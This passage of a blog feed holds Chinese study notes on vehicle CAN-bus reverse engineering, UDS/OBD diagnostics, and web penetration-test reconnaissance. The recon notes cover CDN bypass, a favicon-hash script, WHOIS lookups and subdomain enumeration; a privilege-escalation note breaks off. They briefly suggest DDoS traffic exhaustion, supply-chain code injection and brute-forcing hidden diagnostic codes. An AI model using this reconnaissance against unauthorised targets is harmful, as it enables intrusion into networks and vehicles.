href="#工具与套件"></a> 工具与套件</h1><h2 id="kayak"><a class="markdownIt-Anchor" href="#kayak"></a> Kayak</h2><h1 id="can逆向"><a class="markdownIt-Anchor" href="#can逆向"></a> CAN逆向</h1><p>为了对CAN总线进行逆向，需要先读取CAN包，识别这些包控制什么功能。**然而不需要访问那些CAN官网诊断数据包，因为它的数据不能动。**在学习过程中，获取数据包中包含的信息是理解车辆行为的关键！</p><h2 id="定位can总线"><a class="markdownIt-Anchor" href="#定位can总线"></a> 定位CAN总线</h2><p>参考协议一章，具体在OBD连接器处。参考：</p><img src="/images/%E8%BD%A6%E8%81%94%E7%BD%91%E5%9F%BA%E7%A1%80-SocketCAN%E4%B8%8E%E8%BD%A6%E8%BE%86%E9%80%9A%E4%BF%A1/image-20230620131201206.png" alt="image-20230620131201206" style="zoom: 50%;" /><p>如果没办法连接OBD-II，那么找隐藏的CAN信号：</p><ol><li><p>找双绞线：成对/绞在一起的导线。CAN线路通常是绞在一起的两根导线，例如：</p><p><img src="/images/%E8%BD%A6%E8%81%94%E7%BD%91%E5%9F%BA%E7%A1%80-SocketCAN%E4%B8%8E%E8%BD%A6%E8%BE%86%E9%80%9A%E4%BF%A1/image-20230620131928484.png" alt="image-20230620131928484" /></p><p><img src="/images/%E8%BD%A6%E8%81%94%E7%BD%91%E5%9F%BA%E7%A1%80-SocketCAN%E4%B8%8E%E8%BD%A6%E8%BE%86%E9%80%9A%E4%BF%A1/image-20230620131953355.png" alt="image-20230620131953355" /></p></li><li><p>万用表测电压2.5V，上下波动1V</p></li><li><p>通过双通道示波器，对到线上信号差异做减法，由于差分信号会互相抵消，应该可以看到恒定信号</p></li></ol><p>注意：CAN总线往往是静默的，通常只需要执行很简单的操作就可以唤醒并产生信号。</p><h2 id="使用wireshark与can-utils逆向can总线通信"><a class="markdownIt-Anchor" href="#使用wireshark与can-utils逆向can总线通信"></a> 使用Wireshark与can-utils逆向Can总线通信</h2><h3 id="使用"><a class="markdownIt-Anchor" href="#使用"></a> 使用</h3><p>can-utils一般使用的是candump工具，命令是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">candump -b vcan0 slcan0</span><br></pre></td></tr></table></figure><p>不指定<code>-b</code>，默认也行。</p><p>使用wireshark，点击你想要监听的网卡就行（就是vlan0）</p><h3 id="分组can总线数据流"><a class="markdownIt-Anchor" href="#分组can总线数据流"></a> 分组can总线数据流</h3><p>CAN总线上会有很多噪声</p><h1 id="ecu渗透测试"><a class="markdownIt-Anchor" href="#ecu渗透测试"></a> ECU渗透测试</h1><p>流程为：</p><ol><li>初始化（确定）攻击向量，例如wifi模块</li><li>提取固件，例如使用SmartRF_Flash_Programmer-1.12.8</li><li>攻破SOC系统，里面是一些通信模块（使用PWN方法）</li><li>攻破MCU系统，里面的系统是裸的</li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;概述&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#概述&quot;&gt;&lt;/a&gt; 概述&lt;/h1&gt;
&lt;p&gt;CAN通信，在现实测试中需要了解CAN的各个协议，例如ISO-TP，还有CAN的高低比特率是多少，例如高500，低为250-125，等等。在了解</summary>
      
    
    
    
    <category term="车联网基础" scheme="https://j3f5.github.io/categories/%E8%BD%A6%E8%81%94%E7%BD%91%E5%9F%BA%E7%A1%80/"/>
    
    
    <category term="CAN" scheme="https://j3f5.github.io/tags/CAN/"/>
    
  </entry>
  
  <entry>
    <title>车联网基础-诊断和日志</title>
    <link href="https://j3f5.github.io/articles/2023/06/15/%E8%BD%A6%E8%81%94%E7%BD%91%E5%9F%BA%E7%A1%80-%E8%AF%8A%E6%96%AD%E5%92%8C%E6%97%A5%E5%BF%97/"/>
    <id>https://j3f5.github.io/articles/2023/06/15/%E8%BD%A6%E8%81%94%E7%BD%91%E5%9F%BA%E7%A1%80-%E8%AF%8A%E6%96%AD%E5%92%8C%E6%97%A5%E5%BF%97/</id>
    <published>2023-06-15T05:03:59.000Z</published>
    <updated>2023-06-15T05:03:59.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="诊断服务uds-obd"><a class="markdownIt-Anchor" href="#诊断服务uds-obd"></a> 诊断服务（UDS OBD）</h1><p>先回顾一下一些服务系统</p><ol><li>OBD作为系统，自上而下，标准庞大而清晰。</li><li>UDS作为服务，上层清晰，兼容不同下层，以最终功能实现为要求。</li><li>OBD是关注车辆实时排放的理念形成的行业规范，而UDS是诊断服务的统一化规范。</li><li>UDS是面向整车所有ECU(电控单元)的，而OBD是面向排放系统ECU的。</li></ol><p>再声明一些专有名词：</p><table><thead><tr><th>缩写</th><th>解释</th></tr></thead><tbody><tr><td>DTC</td><td>故障诊断代码</td></tr><tr><td>MIL</td><td>故障指示灯</td></tr><tr><td>PCM</td><td>动力系统控制模块（多个ECU组成）</td></tr><tr><td>RPM</td><td>发动机每分钟转速</td></tr><tr><td>UDS</td><td>统一诊断服务</td></tr><tr><td>EDR</td><td>事件数据记录日志（黑匣子，一般在ECU旁边）</td></tr><tr><td>ACM</td><td>安全气囊控制模块</td></tr><tr><td>SDM</td><td>【通用汽车】感知和诊断模块（存储汽车速度的纵向变化，不记录任何事故后的信息）</td></tr><tr><td>RCM</td><td>【福特】约束控制模块（存储汽车纵向和侧向加速度，与SDR不同）</td></tr><tr><td>ACN</td><td>自动事告呼救系统（将事件告知第三方）</td></tr></tbody></table><h2 id="攻击场景"><a class="markdownIt-Anchor" href="#攻击场景"></a> 攻击场景</h2><p>如果在对车辆总线进行实验时触发了故障，那么需要能够读取并写入PCM以清除故障。则我们需要知道：</p><ol><li>如何读取并清除诊断代码</li><li>查询ECU诊断服务的方法</li><li>如何访问汽车的碰撞数据记录</li><li>如何暴力破解隐藏的诊断代码</li></ol><h1 id="dct故障诊断代码"><a class="markdownIt-Anchor" href="#dct故障诊断代码"></a> DCT（故障诊断代码）</h1><h2 id="概念与知识"><a class="markdownIt-Anchor" href="#概念与知识"></a> 概念与知识</h2><h3 id="格式"><a class="markdownIt-Anchor" href="#格式"></a> 格式</h3><table><thead><tr><th>字节位置</th><th>解释</th></tr></thead><tbody><tr><td>1</td><td>P(0x0)=动力系统，B(0x1)=车身，C(0x2)=底盘，D(0x3)=网络</td></tr><tr><td>2</td><td>0、2、3（SAE标准），1、3（制造商专用码）【注：3可能是anyone】</td></tr><tr><td>3</td><td>字节位置1的子组</td></tr><tr><td>4</td><td>特定的故障区域</td></tr><tr><td>5</td><td>特定的故障区域</td></tr></tbody></table><p>DTC中5个字符仅有网络上的两个原始字节表示。将这两个DTC字节分解成完整的DTC代码方法如下：</p><table><thead><tr><th>格式</th><th>字节1【1】</th><th>-【2】</th><th>-【3】</th><th>字节2【4】</th><th>-【5】</th><th>结果</th></tr></thead><tbody><tr><td>十六进制</td><td>0x0</td><td></td><td>0x4</td><td>0x7</td><td>0x7</td><td>0x0477</td></tr><tr><td>二进制</td><td>00</td><td>00</td><td>0100</td><td>0111</td><td>0111</td><td>第0-15位</td></tr><tr><td>DTC</td><td>P</td><td>0</td><td>4</td><td>7</td><td>7</td><td>P0477</td></tr></tbody></table><p>除了前两个字符外，这些字符都有一一对应的关系（【?】对应上面的字节位置）。这些都是<strong>SAE标准的代码</strong>。</p><h3 id="故障分类"><a class="markdownIt-Anchor" href="#故障分类"></a> 故障分类</h3><ul><li>硬故障：不进行干预就没办法正常消除的故障（例如：清除DTC后，故障仍然出现）</li><li>软故障：间接性问题，例如油箱盖松动之类的问题</li></ul><p>注意：</p><p>并非所有的故障都会点亮MIL灯，它有四类故障</p><ul><li>A类：（总排放失效）亮</li><li>B类：（不影响排放系统）记录数次后亮</li><li>C类：通常不会亮，而是“请尽快保养发动机”</li><li>D类：不亮</li></ul><h3 id="冻结帧数据freeze-frame-data"><a class="markdownIt-Anchor" href="#冻结帧数据freeze-frame-data"></a> 冻结帧数据（Freeze Frame Data）</h3><p>存储DTC时，PCM快照所有相关的发送机部件信息，并存入FFD中。通常包含以下信息：</p><table><thead><tr><th>相关DTC</th><th>发动机负载</th><th>发动机每分钟转速（RPM）</th></tr></thead><tbody><tr><td>发动机温度</td><td>燃油修正</td><td>歧管气压/空气流量（MAP/MAF）值</td></tr><tr><td>操作模式（开/闭电路）</td><td>风门位置</td><td>车速</td></tr></tbody></table><p>理想状态下快照将在DTC出现的时候同时进行，而冻结帧通常在DTC触发后5妙才开始记录。</p><h2 id="读取与清除"><a class="markdownIt-Anchor" href="#读取与清除"></a> 读取与清除</h2><h3 id="读取"><a class="markdownIt-Anchor" href="#读取"></a> 读取</h3><p>使用vehicle spy3不仅能监控和发送报文，还能实现DTC读取和解析，但现在这种功能只适用于采用ISO14229诊断协议的控制器。通过电话与英特佩斯的工程师沟通得知，由于KWP2000协议在美国已经很少使用，所以对采用KWP2000诊断协议的控制器，vehicle spy3仅支持DTC的读取，而不支持DTC的解析。</p><p>工具：</p><ol><li><a href="https://blog.csdn.net/qq_34430371/article/details/114239041">vehicle spy3</a>的使用</li></ol><h3 id="清除"><a class="markdownIt-Anchor" href="#清除"></a> 清除</h3><p>条件：</p><ol><li>PCM三次检查后，不再出现故障，则清除（则硬DTC清除）</li><li>断开电源（则软DTC清除）</li></ol><h1 id="uds统一诊断服务"><a class="markdownIt-Anchor" href="#uds统一诊断服务"></a> UDS——统一诊断服务</h1><p>UDS：向修理人员提供一种统一的展示车辆运行状态的方式（只是展示部分信息），为只读模式。</p><p>使用UDS可以进行：<strong>诊断测试</strong>、<strong>更改固件</strong></p><h2 id="uds安全威胁"><a class="markdownIt-Anchor" href="#uds安全威胁"></a> UDS安全威胁</h2><h2 id="uds刷写"><a class="markdownIt-Anchor" href="#uds刷写"></a> UDS刷写</h2><h3 id="前置知识"><a class="markdownIt-Anchor" href="#前置知识"></a> 前置知识</h3>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;诊断服务uds-obd&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#诊断服务uds-obd&quot;&gt;&lt;/a&gt; 诊断服务（UDS OBD）&lt;/h1&gt;
&lt;p&gt;先回顾一下一些服务系统&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;OBD作为系统，自上而下，标准庞大而</summary>
      
    
    
    
    <category term="车联网基础" scheme="https://j3f5.github.io/categories/%E8%BD%A6%E8%81%94%E7%BD%91%E5%9F%BA%E7%A1%80/"/>
    
    
    <category term="诊断" scheme="https://j3f5.github.io/tags/%E8%AF%8A%E6%96%AD/"/>
    
  </entry>
  
  <entry>
    <title>信息搜集</title>
    <link href="https://j3f5.github.io/articles/2023/06/14/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/"/>
    <id>https://j3f5.github.io/articles/2023/06/14/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/</id>
    <published>2023-06-14T07:00:58.000Z</published>
    <updated>2023-06-14T07:00:58.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="概述"><a class="markdownIt-Anchor" href="#概述"></a> 概述</h1><p>在信息收集阶段，我们需要尽量多的收集关于目标web应用的各种信息，比如：脚本语言的类型、服务器的类型、目录的结构、使用的开源软件、数据库类型、所有链接页面，用到的框架等。</p><p>所以我们首先从几个部分对目标信息进行搜集：</p><ol><li>寻找真实的IP，判断是否存在CDN。如果存在CDN，那么我们打的都是网站的缓存，没办法接触到真实的主机</li><li>寻找旁站，子域名，资产信息，人员信息。扩大攻击面和资料库</li><li>对网站信息进行搜集，例如脚本语言，开源软件，软件架构CMS等等，还可以看看是否存在waf，是什么waf</li><li>拓展网站是否存在APP、微信小程序</li></ol><p><img src="/images/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86.png" alt="信息搜集" /></p><p><img src="/images/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/water.png" alt="water" /></p><h1 id="寻找真实ip"><a class="markdownIt-Anchor" href="#寻找真实ip"></a> 寻找真实IP</h1><h2 id="cdn"><a class="markdownIt-Anchor" href="#cdn"></a> CDN</h2><p>为了加速各个区域对于网站的响应，于是在各个节点布置一个网站的缓存，使得各个区域访问这个网站在时间上不会出现太多延迟。</p><h2 id="判断cdn"><a class="markdownIt-Anchor" href="#判断cdn"></a> 判断CDN</h2><h3 id="超级ping国内多地同时pinghttpswwwpingcn"><a class="markdownIt-Anchor" href="#超级ping国内多地同时pinghttpswwwpingcn"></a> 超级ping（国内多地同时Ping）：<a href="https://www.ping.cn/">https://www.ping.cn/</a></h3><p>如果出现多IP地址，那么就是存在CDN</p><p><img src="/images/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/image-20230707145753239.png" alt="image-20230707145753239" /></p><h3 id="观察请求响应的返回数据的头部"><a class="markdownIt-Anchor" href="#观察请求响应的返回数据的头部"></a> 观察请求响应的返回数据的头部</h3><p>观察是否有 CDN 服务商标识，一般在X-Cache，观察有没有Hit的字样。</p><img src="/images/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/image-20230707150803348.png" alt="image-20230707150803348" style="zoom:50%;" /><h3 id="通过nslookup"><a class="markdownIt-Anchor" href="#通过nslookup"></a> 通过nslookup</h3><img src="/images/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/image-20230707151038051.png" alt="image-20230707151038051" style="zoom:50%;" /><h2 id="绕过cdn"><a class="markdownIt-Anchor" href="#绕过cdn"></a> 绕过CDN</h2><p><img src="/images/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/cdn.png" alt="cdn.png" /></p><h3 id="通过子域名查询"><a class="markdownIt-Anchor" href="#通过子域名查询"></a> 通过子域名查询</h3><p>申请CDN需要钱，并非所有子域名都会配置CDN，所以~</p><h3 id="查询历史dns"><a class="markdownIt-Anchor" href="#查询历史dns"></a> 查询历史DNS</h3><p>站点在使用CDN服务之前，它的真实IP地址可能被DNS服务器所记录到，此时我们就可以通过DNS历史记录找到目标真实IP。以量打量，就是常说的ddos攻击或者说是流量耗尽攻击，在网上开CDN的时候，都会分地区流量，就比如这个节点有1G流量，当这流量用完后，用户再访问就会访问网站真实的ip地址。</p><p>DNSDB：<a href="https://www.dnsdb.io/zh-cn/">https://www.dnsdb.io/zh-cn/</a></p><h3 id="通过邮件返回的地址解析"><a class="markdownIt-Anchor" href="#通过邮件返回的地址解析"></a> 通过邮件返回的地址解析</h3><p>很多公司内部都会有一个邮箱服务器，这种邮箱服务器大部分是不会做CDN的。因为邮箱服务器一般都是公司内部人去访问，所以不做CDN。因此，我们就可以根据对方邮件服务器给我们发送的邮件，来判断对方的IP地址。</p><img src="/images/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/image-20230707151937630.png" alt="image-20230707151937630" style="zoom:33%;" /><img src="/images/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/image-20230707151442232.png" alt="image-20230707151442232" style="zoom:33%;" /><h3 id="国外访问"><a class="markdownIt-Anchor" href="#国外访问"></a> 国外访问</h3><p>有些网站为了节省成本，不会把CDN部署在国外，或者只在客户群体比较多的一些国家进行部署，客户群体少的就没有，不值得搭建CDN，因此这样从国外访问国内的网站就很可能直接访问的就是主站的真实ip地址。（尽量找比较偏僻的国家，或者说就是客户群体很少的国家，进行访问）</p><p><a href="https://tools.ipip.net/cdn.php">https://tools.ipip.net/cdn.php</a></p><h3 id="黑暗引擎搜索特定文件"><a class="markdownIt-Anchor" href="#黑暗引擎搜索特定文件"></a> 黑暗引擎搜索特定文件</h3><p>google，shodan，zoomeye，fofa等</p><p>这里的特定文件，指的是站点的icon文件，也就是网站的图标，一般查看网页源代码可以找到，格式大致<code>http://www.xx.com/favicon.ico</code>。在shodan搜索网站icon图标的语法为：http.favicon.hash:hash值，hash是一个未知的随机数，我们可以通过shodan语法来查看一个已经被shodan收录的网站的hash值，来进一步获取到所有带有某icon的网站。</p><p>shodan的语法：<code>http.favicon.hash:hash</code>值。工具：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#Python2 执行环境</span></span><br><span class="line"><span class="comment">#安装 mmh3 失败记得先安装下这个Microsoft Visual C++ 14.0</span></span><br><span class="line"><span class="keyword">import</span> mmh3</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">response = requests.get(<span class="string">&#x27;http://www.xx.com/favicon.ico&#x27;</span>)</span><br><span class="line">favicon = response.content.encode(<span class="string">&#x27;base64&#x27;</span>)</span><br><span class="line"><span class="built_in">hash</span> = mmh3.<span class="built_in">hash</span>(favicon)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;http.favicon.hash:&#x27;</span>+<span class="built_in">str</span>(<span class="built_in">hash</span>)</span><br></pre></td></tr></table></figure><p>实际上就是收录库的比对</p><h1 id="资产信息"><a class="markdownIt-Anchor" href="#资产信息"></a> 资产信息</h1><p>包括很多，在安全测试中，若 WEB 无法取得进展或无 WEB 的情况下，我们需要借助 APP 或其他资产在进行信息收集，从而开展后续渗透，那么其中的信息收集就尤为重要</p><h2 id="企业信息"><a class="markdownIt-Anchor" href="#企业信息"></a> 企业信息</h2><p>主要可以分为：WHOIS信息查询+IPC信息+股权信息+子公司信息</p><p>主要目的：扩大攻击范围，寻找更多的业务，更多的供应商链，人员信息搜集（敏感信息，可以用来制作字典）</p><h3 id="whois"><a class="markdownIt-Anchor" href="#whois"></a> WHOIS</h3><p>很多网站上都可以收集到whois信息，比如说：</p><blockquote><p><a href="http://xn--who-ok6ez9gts1e.is">国外的who.is</a>：<a href="https://who.is/">https://who.is/</a></p><p>站长之家：<a href="http://whois.chinaz.com/">http://whois.chinaz.com/</a></p><p>爱站：<a href="https://whois.aizhan.com/">https://whois.aizhan.com/</a></p><p>微步：<a href="https://x.threatbook.cn/">https://x.threatbook.cn/</a></p></blockquote><p>这些网站都可以收集whois信息，而且还很全面，</p><p>主要关注：<strong>注册商、注册人、邮件、DNS解析服务器、注册人联系电话</strong></p><p>小技巧：如果在站长之家上隐藏了信息，可在who.is上再次查看。</p><h3 id="企业备案与股份信息"><a class="markdownIt-Anchor" href="#企业备案与股份信息"></a> 企业备案与股份信息</h3><p>有需要的还可以查企业的备案信息，主要有三种方式：</p><blockquote><p>天眼查：<a href="https://www.tianyancha.com/">https://www.tianyancha.com/</a></p><p>ICP备案查询网：<a href="http://www.beianbeian.com/">http://www.beianbeian.com/</a></p><p>国家企业信用信息公示系统：<a href="http://www.gsxt.gov.cn/index.html">http://www.gsxt.gov.cn/index.html</a></p><p>企查查：<a href="https://www.qcc.com/">https://www.qcc.com/</a></p></blockquote><p>注意：国外的服务器一般来说是查不到的，因为他们不需要备案。国内的基本上都可以查到。</p><p>主要关注：股权信息，子公司孙公司（投资超过50%/行政权）</p><h3 id="供应商"><a class="markdownIt-Anchor" href="#供应商"></a> 供应商</h3><p>供应商提供的软件一般是收到该商家信任的，所以可以攻击供应商，以此为跳板注入恶意代码攻击此商家。还可以获取供应商上的其他信息。</p><blockquote><p>网页底部的备案信息</p><p>招标文件</p></blockquote><h3 id="工具"><a class="markdownIt-Anchor" href="#工具"></a> 工具</h3><p><a href="https://github.com/wgpsec/ENScan_GO">https://github.com/wgpsec/ENScan_GO</a></p><p>一款基于各大企业信息API的工具，解决在遇到的各种针对国内企业信息收集难题。一键收集控股公司ICP备案、APP、小程序、微信公众号等信息聚合导出。</p><h3 id="例子"><a class="markdownIt-Anchor" href="#例子"></a> 例子</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">网址：917hh.com</span><br><span class="line">注册商：Alibaba Cloud Computing (Beijing) Co.,Ltd.</span><br><span class="line">注册人：</span><br><span class="line">邮件：</span><br><span class="line">注册联系人电话：</span><br><span class="line">DNS服务器：dns15.hichina.com - 139.224.142.112dns16.hichina.com - 47.118.199.201</span><br></pre></td></tr></table></figure><h2 id="子域名"><a class="markdownIt-Anchor" href="#子域名"></a> 子域名</h2><h3 id="通过谷歌语法"><a class="markdownIt-Anchor" href="#通过谷歌语法"></a> 通过谷歌语法</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">site:baidu.com -www</span><br></pre></td></tr></table></figure><h3 id="聚合网站"><a class="markdownIt-Anchor" href="#聚合网站"></a> 聚合网站</h3><p>GUI好看，结果多：<a href="https://securitytrails.com">https://securitytrails.com</a></p><p>这个网站能查很多东西，包括whois，还有子域名，很厉害：<a href="https://www.virustotal.com/gui/home/search">https://www.virustotal.com/gui/home/search</a></p><p>这个网站能查的好像就少一些，所以一般用上面的吧：<a href="https://dnsdumpster.com/">https://dnsdumpster.com/</a></p><h3 id="ssl证书"><a class="markdownIt-Anchor" href="#ssl证书"></a> SSL证书</h3><p>SSL证书是需要申请的，用来保证用户与网站之间的通信。一个SSL/TLS证书通常包含域名、子域名和邮件地址，查找一个域名证书的最简单方法是使用搜索引擎来收集计算机的CT日志，并让任何搜索引擎搜索它们。前两种比较常用。</p><blockquote><p>证书透明性（Certificate Transparency，CT）是 Google 的公开项目，通过让域所有者、CA 和域用户对 SSL 证书的发行和存在进行审查，来纠正这些基于证书的威胁</p></blockquote><ol><li><a href="https://crt.sh/">https://crt.sh/</a></li><li><a href="https://censys.io/">https://censys.io/</a></li></ol><h3 id="爆破枚举"><a class="markdownIt-Anchor" href="#爆破枚举"></a> 爆破枚举</h3><p>这个就有很多工具可以用了，大佬们都有自己用的顺手的工具，比较常见的是：</p><blockquote><ol><li>layer子域名挖掘机</li><li>subDomainsBrute</li><li>K8</li><li>orangescan</li><li>DNSRecon</li><li>在线zcjun：<a href="http://z.zcjun.com/">http://z.zcjun.com/</a></li></ol></blockquote><p>这里重点推荐 layaer 和 subDomainsBrute 工具，可以从子域名入侵到主站。</p><p>小技巧：在<a href="https://github.com/">https://github.com/</a> 上也可以搜索子域名，运气好的话，会有意想不到的收获。例如：<a href="https://github.com/search?q=subdomain+baidu.com&amp;type=code">https://github.com/search?q=subdomain+baidu.com&amp;type=code</a></p><h3 id="dns公开数据集"><a class="markdownIt-Anchor" href="#dns公开数据集"></a> DNS公开数据集</h3><p>利用已有公开的扫描数据集，对子域名信息进行收集。</p><blockquote><p><a href="https://opendata.rapid7.com/">https://opendata.rapid7.com/</a></p></blockquote><h3 id="dns共享记录查询"><a class="markdownIt-Anchor" href="#dns共享记录查询"></a> DNS共享记录查询</h3><p>原理：查询共享DNS服务器主机来获取相关的域名</p><ol><li><p>首先查询是否存在NS服务器（这个服务器记录了遇到域名应该去哪里的DNS解析）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nslookup -query=ns baidu.com</span><br></pre></td></tr></table></figure></li><li><p>将非权威应答中的NS服务器带到下面的网站查询</p><p><a href="https://hackertarget.com/find-shared-dns-servers/">https://hackertarget.com/find-shared-dns-servers/</a></p></li></ol><h3 id="子域名爆破泛解析问题"><a class="markdownIt-Anchor" href="#子域名爆破泛解析问题"></a> 子域名爆破泛解析问题</h3><p>利用通配符* （星号）来做次级域名以实现所有的次级域名均指向同一IP地址。在域名前添加任何子域名，均可访问到所指向的IP地址。</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">常规域名解析</span><br><span class="line">www.wolke.cn   10.10.10.10</span><br><span class="line"></span><br><span class="line">域名泛解析</span><br><span class="line">*.wolke.cn     10.10.10.10</span><br><span class="line">访问子域名a.wolke.cn，b.wolke.cn等均指向10.10.10.10</span><br></pre></td></tr></table></figure><p>这为我们去做子域名爆破带来了极大的不便，以前子域名爆破常用的是layer子域名挖掘机。不过layer子域名挖掘机在跑具有泛解析的站的时候，就不是那么适用。</p><p>换句话说：<strong>所有子域名都有效，但是其实不是的。</strong></p><p><img src="/images/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/v2-32e0407165ef91e68b36461382f8840e_720w.jpg" alt="子域名爆破的泛解析问题" /></p><h4 id="判断是否泛解析"><a class="markdownIt-Anchor" href="#判断是否泛解析"></a> 判断是否泛解析</h4><ol><li>ping一个不可能存在子域名，看能不能到达</li></ol><p>解决：</p><p>比如开源工具oneforall会首先访问一个随机的并不存在的域，通过返回结果判断是否存在泛解析，确定存在泛解析以后，<strong>程序会开始不断的循环产生随机域名，去向服务器查询，将每次查询到的IP和TTL记录下来，直到大部分的IP地址出现次数都大于两次，则IP黑名单的收集结束</strong>，在得到了IP黑名单以后，oneforall接下来会将自己的字典中的每一项和要指定查询的域名进行拼接。在爆破过程中根据IP黑名单进行过滤。但这种宽泛的过滤容易导致漏报，所以oneforall将 TTL 也作为黑名单规则的一部分，评判的依据是：<strong>在权威 DNS 中，泛解析记录的 TTL 肯定是相同的，如果子域名记录相同，但 TTL 不同，那这条记录可以说肯定不是泛解析记录</strong></p><p>参考：<a href="https://security.tencent.com/index.php/blog/msg/161">https://security.tencent.com/index.php/blog/msg/161</a></p><h2 id="某个域名的ip端口业务信息等"><a class="markdownIt-Anchor" href="#某个域名的ip端口业务信息等"></a> 某个域名的IP，端口，业务信息等</h2><h3 id="应用中的信息"><a class="markdownIt-Anchor" href="#应用中的信息"></a> 应用中的信息</h3><h4 id="微信支付宝小程序"><a class="markdownIt-Anchor" href="#微信支付宝小程序"></a> 微信/支付宝小程序</h4><h4 id="微信公众号"><a class="markdownIt-Anchor" href="#微信公众号"></a> 微信公众号</h4><h4 id="手机app抓包历史版本"><a class="markdownIt-Anchor" href="#手机app抓包历史版本"></a> 手机APP抓包+历史版本</h4><ol><li>APP 提取一键反编译提取</li><li>APP 抓数据包进行工具配合</li><li>各种第三方应用相关探针技术</li><li>各种服务接口信息相关探针技术</li></ol><p><strong>ApkAnalyser-Apk数据提取</strong>，需要提取的apk文件放在apps文件夹内，直接运行apkAnalyser.exe</p><p>提取出来的文件会在result中。urls一般有文件的url链接！还可以利用 burp 历史抓更多 URL！</p><img src="/images/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/image-20230707160531536.png" alt="image-20230707160531536" style="zoom:50%;" /><h1 id="其他"><a class="markdownIt-Anchor" href="#其他"></a> 其他</h1><ol><li>可以写脚本用来爬取 fofa 上的IP和域名数据</li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;概述&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#概述&quot;&gt;&lt;/a&gt; 概述&lt;/h1&gt;
&lt;p&gt;在信息收集阶段，我们需要尽量多的收集关于目标web应用的各种信息，比如：脚本语言的类型、服务器的类型、目录的结构、使用的开源软件、数据库类型、所</summary>
      
    
    
    
    <category term="渗透测试基础" scheme="https://j3f5.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%9F%BA%E7%A1%80/"/>
    
    
    <category term="整体流程" scheme="https://j3f5.github.io/tags/%E6%95%B4%E4%BD%93%E6%B5%81%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>权限提升</title>
    <link href="https://j3f5.github.io/articles/2023/06/14/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/"/>
    <id>https://j3f5.github.io/articles/2023/06/14/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/</id>
    <published>2023-06-14T02:42:23.000Z</published>
    <updated>2023-06-29T02:42:23.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a class="markdownIt-Anchor" href="#前言"></a> 前言</h1><p>一般渗透流程就是获取webshell权限、获取其他应用权限，然后提权获取服务器系统管理员权限，获取system/root权限。这里主要是思路的体现。</p><p><img src="/images/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87.png" alt="权限提升" /></p><h2 id="相关注意点"><a class="markdownIt-Anchor" href="#相关注意点"></a> 相关注意点</h2><ol><li>前期-中期-后期对应知识关系</li><li>知识点顺序，理解思路，分类介绍等</li><li><strong>注重理解当前权限对应可操作的事情</strong></li><li>相关的操作被拒绝无法实现的时候就会涉及到权限提升</li></ol><h2 id="权限分类"><a class="markdownIt-Anchor" href="#权限分类"></a> 